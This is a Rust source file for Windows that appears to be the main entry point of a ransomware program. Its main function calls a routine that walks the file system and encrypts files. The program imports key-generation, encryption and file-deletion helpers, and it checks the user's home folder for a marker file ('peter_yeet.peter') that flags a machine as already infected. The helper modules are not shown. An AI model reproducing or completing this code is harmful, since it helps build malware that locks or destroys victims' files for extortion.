#[cfg(windows)]
extern crate winapi;

mod encryption;
mod lib;
mod traversing;
use encryption::{decrypt, encrypt, generate_key};
use std::ffi::CString;
use std::ptr::null_mut;
use std::str;
use traversing::{traverse_and_delete, traverse_and_encrypt};
use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use winapi::um::winbase::GetUserNameA;
fn main() {
    // if already_encrypt() {
    //     println!("Already encrypt");
    // } else {
    //     println!("Havent encrypt");
    // }

    traverse_and_encrypt();
}

fn already_encrypt() -> bool {
    let mut size: u32 = 0;
    let mut buffer: Vec<i8> = Vec::new();
    let mut _user_name: Vec<u8> = Vec::new();
    unsafe {
        GetUserNameA(null_mut(), &mut size);
        buffer.resize(size as usize, 0i8);

        GetUserNameA(buffer.as_mut_ptr(), &mut size);
        _user_name = std::mem::transmute(buffer);
        _user_name.resize((size - 1) as usize, 0u8);

        let mut full_path = String::from("C:\\Users\\");
        full_path.push_str(str::from_utf8(&_user_name[..]).unwrap());
        full_path.push_str("\\peter_yeet.peter");

        let full_path: CString = CString::new(full_path).unwrap();

        if CreateFileA(
            full_path.as_ptr(),
            1,
            1,
            null_mut(),
            OPEN_EXISTING,
            0x80,
            null_mut(),
        ) == INVALID_HANDLE_VALUE
        {
            return false;
        }
    }
    true
}
